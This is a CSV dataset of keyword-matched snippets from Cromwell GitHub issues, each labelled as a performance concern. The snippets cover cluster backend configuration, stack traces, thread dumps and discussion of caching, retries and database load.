quality_attribute,sentence,source,author,repo,version,id,keyword,matched_word,match_idx,wiki,url,total_similar,target_keywords,target_matched_words
Performance,"version ：cromwell-47. Architecture: DOCKER SGE docker-mysql. cromwell server Intermittent appearance qsub：command not found , server To get it back online. The relevant portion of cromwell.conf：. default = ""SGE""; providers {; # Configure the SGE backend; SGE {. # Use the config backend factory; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; #root = ""/GeneCloud001/server/cr_server/cromwell-exe""; #dockerRoot = ""/GeneCloud001/server/cr_server/cromwell-exe""; #script-epilogue = ""chmod -R a+rw * && chmod -R a+rw * && sync""; # Limits the number of concurrent jobs; #concurrent-job-limit = 500; # Define runtime attributes for the SGE backend.; # memory_gb is a special runtime attribute. See the cromwell README for more info.; runtime-attributes = """"""; Int cpu = 1; Float? memory_gb; String? sge_queue; String? sge_project; String docker = ""jycloud/base:latest""; String? mnt_db_dir ####数据库挂载目录; String? mnt_input_dir ####输入bam挂载目录; String? mnt_out_dir ####输出挂载目录; String docker_user = ""$EUID""; String num_proc = 1; String? task_queue; String? mount; """"""; submit-docker = """"""; /opt/gridengine/bin/lx-amd64/qsub \; -terse \; -V \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -l ${""vf="" + memory_gb + ""g""},p=${num_proc} \; -b y docker run --rm -v ${cwd}:${docker_cwd} --user 1002 -m ${(memory_gb + (memory_gb / 2 )) + ""G""} --cpus ${num_proc} -v ${mnt_db_dir}:${mnt_db_dir}:ro -v ${mnt_out_dir}:${mnt_out_dir} -v /mnt/cache/sentieon:/mnt/cache/sentieon ${mount} ${docker} /bin/bash ${docker_script}",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5334:597,concurren,concurrent,597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5334,4,"['cache', 'concurren']","['cache', 'concurrent', 'concurrent-job-limit']"
Performance,wExecutionActorData.scala:92); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.handleExecutionSuccess(WorkflowExecutionActor.scala:323); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$handleCallSuccessful(WorkflowExecutionActor.scala:308); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor$$anonfun$3.applyOrElse(WorkflowExecutionActor.scala:96); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor$$anonfun$3.applyOrElse(WorkflowExecutionActor.scala:81); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at akka.actor.FSM$class.processEvent(FSM.scala:663); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowExecutionActor.scala:32); 	at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processEvent(WorkflowExecutionActor.scala:32); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:496); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:32); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277496027:3981,concurren,concurrent,3981,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277496027,12,['concurren'],['concurrent']
Performance,"wait \; --job-name=${job_name} \; --chdir=${cwd} \; --output=${out} \; --error=${err} \; --time=${runtime_minutes} \; ${""--cpus-per-task="" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --partition=wzhcexclu06 \; --wrap ""/bin/bash ${script}""; """""". submit-docker = """"""; # SINGULARITY_CACHEDIR needs to point to a directory accessible by; # the jobs (i.e. not lscratch). Might want to use a workflow local; # cache dir like in run.sh; source /work/share/ac7m4df1o5/bin/cromwell/set_singularity_cachedir.sh; SINGULARITY_CACHEDIR=/work/share/ac7m4df1o5/bin/cromwell/singularity-cache; source /work/share/ac7m4df1o5/bin/cromwell/test.sh ${docker}; echo ""SINGULARITY_CACHEDIR $SINGULARITY_CACHEDIR""; if [ -z $SINGULARITY_CACHEDIR ]; then; CACHE_DIR=$HOME/.singularity; else; CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; echo ""SINGULARITY_CACHEDIR $SINGULARITY_CACHEDIR""; LOCK_FILE=$CACHE_DIR/singularity_pull_flock. # we want to avoid all the cromwell tasks hammering each other trying; # to pull the container into the cache for the first time. flock works; # on GPFS, netapp, and vast (of course only for processes on the same; # machine which is the case here since we're pulling it in the master; # process before submitting).; #flock --exclusive --timeout 1200 $LOCK_FILE \; # singularity exec --containall docker://${docker} \; # echo ""successfully pulled ${docker}!"" &> /dev/null. # Ensure singularity is loaded if it's installed as a module; module load apps/singularity/3.7.3. # Build the Docker image into a singularity image; #IMAGE=$(echo $SINGULARITY_CACHEDIR/pull/${docker}.sif|sed ""s#:#_#g""); #singularity build $IMAGE docker://${docker}. # Submit the script to SLURM; sbatch \; --wait \; --job-name=${job_name} \; --chdir=${cwd} \; --output=${cwd}/execution/stdout \; --error=${cwd}/execution/stderr \; --time=${runtime_minutes} \; ${""--cpus-per-task="" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --partition=wzhcexclu06 \; --wrap ""singularity exec",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:8480,cache,cache,8480,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['cache'],['cache']
Performance,"wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:197",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2551,concurren,concurrent,2551,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1674,concurren,concurrent,1674,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"we had emailed Dion about this a few weeks back, he said, . > ""Yep, we do run more tasks in prod, but even with those tasks we can not guarantee 100% of RPCs succeeding. Internally we do retry any backend dependencies silently (may manifest in slightly higher response times), but it's not unexpected to have a few sneak through. For these situations it's advisable to have a backoff / retry for 5xx level errors that are clearly a problem on our end.; > I've checked back on the time range on those two operations, there doesn't seem to be any wide spread issues during that time on our end. We do have monitoring on the unexpected error rates, would you say your error rates are higher than 0.1 or 0.01% ?  (per RPC call vs per operation, as I think you poll each operation a significant number of times?)."". In conversation, Miguel said:. > ""We have a retry on this call, but it does not back off very aggressively. I'll make a note of it with the Cromwell devs."". Almost all of these failures happened on 5/25. It seems like JES is mostly available, but when unavailable this error causes almost everything running to fail.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/903#issuecomment-222799850:260,response time,response times,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/903#issuecomment-222799850,2,['response time'],['response times']
Performance,"we working on an HPC without root and network and I often get the following message, does this mean that my cache calls are failing.; we using the singularity method of task execution; ```; cromwell-system-akka.dispatchers.engine-dispatcher-27 WARN - BackendPreparationActor_for_bcfd9d26:UnmappedBamToAlignedBam.SamToFastqAndBwaMemAndMba:14:1 [UUID(bcfd9d26)]: Docker lookup failed; cala:35); ```. How do I set it up to enable caching calls?. ------------------------------------------------------------------------------------------; running file; ```; java -jar -Ddocker.hash-lookup.method=local -Ddocker.hash-lookup.enabled=true -Dwebservice.port=8088 -Dwebservice.interface=0.0.0.0 -Dconfig.file=/work/share/ac7m4df1o5/bin/cromwell/3_config/cromwellslurmsingularitynew.conf ./cromwell-84.jar server. ```; config ; ```; # This line is required. It pulls in default overrides from the embedded cromwell; # `reference.conf` (in core/src/main/resources) needed for proper performance of cromwell.; include required(classpath(""application"")). # Cromwell HTTP server settings; webservice {; #port = 8000; #interface = 0.0.0.0; #binding-timeout = 5s; #instance.name = ""reference""; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }. # Cromwell ""system"" settings; system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; #abort-jobs-on-terminate = false. # this tells Cromwell to retry the task with Nx memory when it sees either OutOfMemoryError or Killed in the stderr file.; memory-retry-error-keys = [""OutOfMemory"", ""Out Of Memory"",""Out of memory""]; # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; #graceful-server-shutdown = true. # Cromwell wi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:108,cache,cache,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,2,"['cache', 'perform']","['cache', 'performance']"
Performance,well.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$1.applyOrElse(JobPreparationActor.scala:48); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:48); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$receive$1.applyOrElse(JobPreparationActor.scala:27); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.aroundReceive(JobPreparationActor.scala:18); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: wdl4s.exception.ValidationException: Input evaluation for Call dna_mapping_38.libraryMerge failed.:; inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 		at wdl4s.Call.evaluateTaskInputs(Call.scala:117); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:42); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:35); 		at scala.util.Try$.apply(Try.scala:192); 		at cromwell.en,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:4113,concurren,concurrent,4113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['concurren'],['concurrent']
Performance,well.engine.workflow.lifecycle.execution.WorkflowExecutionActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowExecutionActor.scala:32); 	at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processEvent(WorkflowExecutionActor.scala:32); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:496); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:32); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: lenthall.exception.AggregatedException: :; Variable 'non_existent_scatter_variable' not found; 	at lenthall.util.TryUtil$.sequenceIterable(TryUtil.scala:26); 	at lenthall.util.TryUtil$.sequence(TryUtil.scala:33); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$startRunnableScopes(WorkflowExecutionActor.scala:373); 	... 20 common frames omitted; 	Suppressed: wdl4s.exception.VariableNotFoundException$$anon$1: Variable 'non_existent_scatter_variable' not found; 		at wdl4s.exception.VariableNotFoundException$.apply(LookupException.scala:17); 		at wdl4s.Scope$$anonfun$6.apply(Scope.scala:268); 		at wdl4s.Scope$$anonfun$6.apply(Scope.scala:268); 		at scala.Op,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2020:2860,concurren,concurrent,2860,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2020,1,['concurren'],['concurrent']
Performance,"what are the reasons for ""Could not copy a suitable cache hit""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6484:52,cache,cache,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6484,1,['cache'],['cache']
Performance,"what does the Y axis represent? Maximum requests/s? What is the takeaway? . It _looks_ like performance degraded slightly, no? So the question is whether to move ahead despite this? If that is the case I vote yes, let's move ahead.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5150#issuecomment-529975832:92,perform,performance,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5150#issuecomment-529975832,1,['perform'],['performance']
Performance,which reminds me we need to inline the Docker image cache manifest the same way we did the reference file manifest...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6206#issuecomment-793158887:52,cache,cache,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6206#issuecomment-793158887,1,['cache'],['cache']
Performance,"work bytes higher:. <img width=""1338"" alt=""Screen Shot 2019-09-13 at 8 13 00 PM"" src=""https://user-images.githubusercontent.com/1087943/64965213-93d73b80-d86a-11e9-9278-03b6f665c378.png"">. ---. Database page read/writes identical:. <img width=""1334"" alt=""Screen Shot 2019-09-13 at 8 13 39 PM"" src=""https://user-images.githubusercontent.com/1087943/64965215-93d73b80-d86a-11e9-9db5-4416f5e94719.png"">. ---. Database CPU identical:. <img width=""1332"" alt=""Screen Shot 2019-09-13 at 8 13 52 PM"" src=""https://user-images.githubusercontent.com/1087943/64965216-946fd200-d86a-11e9-9735-6d91a8b74a4d.png"">. ---. Database egress bytes modestly higher, consistent with higher inbound on summarizer:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 14 33 PM"" src=""https://user-images.githubusercontent.com/1087943/64965217-946fd200-d86a-11e9-8fb5-c11a49da15e4.png"">. ---. Not too surprising, but SQL query rate also identical:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 15 13 PM"" src=""https://user-images.githubusercontent.com/1087943/64965218-946fd200-d86a-11e9-9db7-3149df61c0e0.png"">. ---. I thought it was interesting that the only variable that showed much change is bytes over the network. Theory:. MySQL pages on disk are buckets of row values. MySQL accesses the disk at the granularity of a page, it can't fetch just a single value. Therefore, fetching some data from a page (MySQL filtering) versus all data from a page (client-side filtering) does not make a difference in the number of pages read. This is supported by the graph. It would also appear that filtering in memory, whether on client or server, does not have much of a CPU cost at all either for Cromwell nor for MySQL, because we do not see MySQL doing any less work nor Cromwell doing any more. I think this is because once a set of rows is already in memory (after reading a page or receiving the rows over the wire) choosing specific ones is trivial. For MySQL, finding and loading the pages into memory is the hard part.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474:2735,load,loading,2735,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474,1,['load'],['loading']
Performance,"worker-15"" #19 daemon prio=5 os_prio=31 tid=0x00007fb76abaa800 nid=0x6b03 waiting on condition [0x000000012a1e3000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0060ab0> (a java.util.concurrent.CountDownLatch$Sync); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:231); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2$$anon$4.block(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinPool.managedBlock(Redefined); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2.blockOn(ExecutionContextImpl.scala:44); at scala.concurrent.Await$.ready(package.scala:169); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala:29); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala:433); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala); at scala.concurrent.impl.CallbackRunnable.run(Redefined); at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scal",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:45288,concurren,concurrent,45288,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"writing all of that crap we write to logs is a nontrivial performance impact, but we like logs so we've got to do it. we have a pretty vanilla logging setup, we could be *way* smarter about things in terms of impact to performance. this would help there. . risk of dropping is small and tunable, where as one tunes the risk down so goes the performance gain (and vice versa). one of those things where if you can live with the slight possibility that any particular specific log message never makes it you're AOK.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329791294:58,perform,performance,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329791294,4,"['perform', 'tune']","['performance', 'tunes']"
Performance,"x7103 in Object.wait() [0x000000012ccb5000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x00000006c0624180> (a java.lang.ref.ReferenceQueue$Lock); at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43). ""ForkJoinPool-3-worker-15"" #19 daemon prio=5 os_prio=31 tid=0x00007fb76abaa800 nid=0x6b03 waiting on condition [0x000000012a1e3000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0060ab0> (a java.util.concurrent.CountDownLatch$Sync); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:231); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at akka.actor.ActorSystemImpl$TerminationCallbacks.ready(Redefined); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2$$anon$4.block(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinPool.managedBlock(Redefined); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2.blockOn(ExecutionContextImpl.scala:44); at scala.concurrent.Await$.ready(package.scala:169); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellS",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:44895,concurren,concurrent,44895,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"xecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-2"" #43 prio=5 os_prio=31 tid=0x00007fb76e8ee000 nid=0x3f0b waiting on condition [0x000000012ee35000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""_jprofiler_control_sampler"" #34 daemon prio=9 os_prio=31 tid=0x00007fb771044800 nid=0x6307 waiting on condition [0x000000012ab3a000]; java.lang.Thread.State: TIMED_WAITING (sleeping); at java.lang.Thread.sleep(Native Method); at com.jprofiler.agent.probe.y.run(ejt:1030). ""_jprofiler_native_sampler"" #37 daemon prio=10 os_prio=31 tid=0x00007fb76d269000 nid=0x5d07 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""_jprofiler_native_comm"" #36 daemon prio=5 os_prio=31 tid=0x00007fb770d7d000 nid=0x3707 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""_jprofiler_sampler"" #35 daemon prio=10 os_prio=31 tid=0x00007fb771027000 nid=0x7707 waiting on condition [0x000000012cb95000]; java.lang.Thread.State: TIMED_WAITING (sleeping); at java.lang.Thread.sleep(Native Method); at com.jprofiler.agent.sampler.Sampler.run(ejt:84). ""Attach Listener"" #33 daemon prio=9 os",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:35152,concurren,concurrent,35152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
